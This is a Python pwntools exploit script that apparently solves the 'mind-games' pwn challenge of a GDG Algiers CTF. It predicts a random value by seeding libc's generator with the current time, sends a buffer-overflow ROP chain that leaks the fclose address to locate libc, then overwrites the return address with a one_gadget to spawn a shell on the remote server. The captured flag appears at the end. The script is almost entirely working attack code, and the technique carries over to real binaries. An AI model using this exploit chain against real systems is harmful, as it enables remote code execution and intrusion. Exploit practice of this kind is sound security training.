
import ctypes
from pwn import *

libc = ELF('./lib/libc.so.6')

fcl = libc.sym['fclose']

libsystem = ctypes.CDLL('./lib/libc.so.6')

libsystem.srand(libsystem.time(0))

rr = process('/media/sf_G_DRIVE/a.out')
# r = process('/home/localhost/test/mind-games')
r = remote('pwn.chal.ctf.gdgalgiers.com', 1404)


aaa = rr.recv()

rr.close()

r.recvuntil(b'mind? ')

pop_rdi = 0x4014c3 #: pop rdi; ret;

p = aaa
p += b'A' * (16 - len(aaa))
p += ((56 - len(p)) // 8) * p64(0x400710)
p += p64(pop_rdi)
p += p64(0x404028)
p += p64(0x401124)
p += p64(0x401366)


r.sendline(p)

leak = r.recv().split()[13]
# leak = r.recv().split()[-1] # local
leak = int.from_bytes(leak, byteorder='little') - fcl

print(hex(leak))

rr = process('/media/sf_G_DRIVE/a.out')

aaa = rr.recv()

p = aaa
p += b'A' * (16 - len(aaa))
p += ((56 - len(p))) * b'A'
p += p64(0xe6c84+leak)

r.sendline(p)

r.interactive()

# CyberErudites{Putt1nG_4n_END_to_Th1S_m4DN3s$_0NcE_4Nd_F0r_4Nd_ALl}
